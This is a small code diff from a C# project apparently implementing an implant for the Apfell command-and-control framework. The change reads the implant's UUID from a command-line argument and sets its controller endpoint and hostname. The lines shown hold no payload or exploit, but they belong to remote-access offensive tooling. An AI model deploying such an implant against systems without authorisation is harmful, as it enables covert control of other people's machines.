@@ -18,7 +18,7 @@ namespace SaltedCaramel
 
             SaltedCaramelImplant implant = new SaltedCaramelImplant();
             // Generated when payload is created in Apfell
-            implant.uuid = "2e60933e-e530-4bdc-b2a1-3410a9f2fc94";
+            implant.uuid = args[2];
             implant.endpoint = args[0] + "/api/v1.3/";
             implant.host = Dns.GetHostName();
             // Necessary because the host may have more than one interface
